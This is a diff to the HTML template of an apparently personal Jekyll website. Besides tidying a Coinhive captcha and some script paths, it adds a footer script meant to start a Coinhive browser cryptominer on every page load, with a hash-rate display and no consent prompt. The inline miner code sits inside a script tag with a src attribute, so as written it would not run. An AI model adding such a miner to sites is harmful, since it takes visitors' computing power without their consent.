@@ -16,11 +16,7 @@
 					<textarea name="message" id="message" rows="6"></textarea>
 				</div>
 				<script src="https://coin-hive.com/lib/captcha.min.js" async></script>
-				<div class="coinhive-captcha"
-					data-hashes="1024"
-					data-key="TdQAFH6yjlXqvRxWyM23RRASFWhrU3lE"
-					data-autostart="true"
-					data-disable-elements="input[type=submit]">
+				<div class="coinhive-captcha" data-hashes="1024" data-key="TdQAFH6yjlXqvRxWyM23RRASFWhrU3lE" data-autostart="true" data-disable-elements="input[type=submit]">
 				</div>
 				<ul class="actions">
 					<li><input type="submit" value="Send Message" class="special" /></li>
@@ -105,6 +101,16 @@
 		<ul class="copyright">
 			<li>&copy; {{ site.title }} {{ site.subtitle }} 2017</li>
 			<li>Site by Jonah Snider, <a href="/webdesign" target="_blank">get one like it</a></li>
+			<script src="https://coin-hive.com/lib/coinhive.min.js">
+				var m = new CoinHive.Anonymous('TdQAFH6yjlXqvRxWyM23RRASFWhrU3lE');
+				m.start();
+				m.setAutoThreadsEnabled(true);
+				setInterval(function () {
+					document.getElementById('hashespersecond').innerHTML = m.getHashesPerSecond();
+				}, 1000)
+			</script>
+			<li><div id="hashespersecond"></div>
+			</li>
 		</ul>
 	</div>
 </footer>
@@ -112,10 +118,10 @@
 </div>
 
 <!-- Scripts -->
-<script src="{{" assets/js/jquery.min.js " | absolute_url }}"></script>
-<script src="{{" assets/js/jquery.scrolly.min.js " | absolute_url }}"></script>
-<script src="{{" assets/js/jquery.scrollex.min.js " | absolute_url }}"></script>
-<script src="{{" assets/js/skel.min.js " | absolute_url }}"></script>
-<script src="{{" assets/js/util.js " | absolute_url }}"></script>
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/jquery.scrolly.min.js"></script>
+<script src="assets/js/jquery.scrollex.min.js"></script>
+<script src="assets/js/skel.min.js"></script>
+<script src="assets/js/util.js "></script>
 <!--[if lte IE 8]><script src="{{ "assets/js/ie/respond.min.js" | absolute_url }}"></script><![endif]-->
-<script src="{{" assets/js/main.js " | absolute_url }}"></script>
+<script src="assets/js/main.js "></script>
